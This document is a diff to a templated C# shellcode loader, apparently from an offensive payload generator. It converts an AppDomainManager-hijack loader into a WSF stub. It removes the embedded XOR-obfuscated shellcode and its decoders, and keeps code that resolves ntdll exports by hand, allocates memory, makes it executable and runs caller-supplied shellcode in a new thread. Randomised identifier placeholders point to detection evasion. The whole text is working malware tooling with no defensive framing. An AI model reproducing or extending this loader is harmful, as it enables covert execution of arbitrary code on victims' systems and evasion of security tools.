@@ -1,8 +1,8 @@
 using System;
 using System.Runtime.InteropServices;
 
-namespace {{ appdomain_namespace }} {
-    public class {{ appdomain_type_name }} : AppDomainManager {
+namespace {{ wsf_stub_namespace }} {
+    public class {{ wsf_stub_type_name }} {
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate int {{ v.del_nt_alloc }}(IntPtr ph, ref IntPtr ba, UIntPtr zb, ref UIntPtr rs, uint at, uint prot);
@@ -22,19 +22,6 @@ namespace {{ appdomain_namespace }} {
             var b = new byte[c.Length + 1];
             for (int i = 0; i < c.Length; i++) b[i] = (byte)c[i];
             return b;
-        }
-
-        static byte[] {{ v.fn_hex }}(string h) {
-            var b = new byte[h.Length / 2];
-            for (int i = 0; i < b.Length; i++)
-                b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
-            return b;
-        }
-
-        static byte[] {{ v.fn_xor }}(byte[] d, byte[] k) {
-            var o = new byte[d.Length];
-            for (int i = 0; i < d.Length; i++) o[i] = (byte)(d[i] ^ k[i % k.Length]);
-            return o;
         }
 
         static IntPtr {{ v.fn_getexport }}(IntPtr mod, byte[] name) {
@@ -60,7 +47,7 @@ namespace {{ appdomain_namespace }} {
             return IntPtr.Zero;
         }
 
-        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
+        public static void Run(byte[] sc) {
             IntPtr ntdll = IntPtr.Zero;
             foreach (System.Diagnostics.ProcessModule m in
                      System.Diagnostics.Process.GetCurrentProcess().Modules)
@@ -83,18 +70,11 @@ namespace {{ appdomain_namespace }} {
             var {{ v.fn_nt_thread }} = ({{ v.del_nt_thread }})Marshal.GetDelegateForFunctionPointer(
                 {{ v.fn_exec }}_thrd,  typeof({{ v.del_nt_thread }}));
 
-            byte[] {{ v.var_key }} = {{ v.fn_hex }}({% for c in key_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %});
-            for (int {{ v.var_iv }}_i = 0; {{ v.var_iv }}_i < {{ v.var_key }}.Length; {{ v.var_iv }}_i++)
-                {{ v.var_key }}[{{ v.var_iv }}_i] ^= (byte){{ key_tweak }};
-            byte[] {{ v.var_shellcode }} = {{ v.fn_xor }}(
-                {{ v.fn_hex }}({% for c in shellcode_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %}),
-                {{ v.var_key }});
-
             IntPtr {{ v.var_region }} = IntPtr.Zero;
-            UIntPtr {{ v.var_fiber }} = (UIntPtr){{ v.var_shellcode }}.Length;
+            UIntPtr {{ v.var_fiber }} = (UIntPtr)sc.Length;
             if ({{ v.fn_nt_alloc }}((IntPtr)(-1), ref {{ v.var_region }}, UIntPtr.Zero,
                     ref {{ v.var_fiber }}, 0x3000, 0x04) != 0) return;
-            Marshal.Copy({{ v.var_shellcode }}, 0, {{ v.var_region }}, {{ v.var_shellcode }}.Length);
+            Marshal.Copy(sc, 0, {{ v.var_region }}, sc.Length);
             uint {{ v.fn_setup }}_old;
             {{ v.fn_nt_prot }}((IntPtr)(-1), ref {{ v.var_region }},
                 ref {{ v.var_fiber }}, 0x20, out {{ v.fn_setup }}_old);
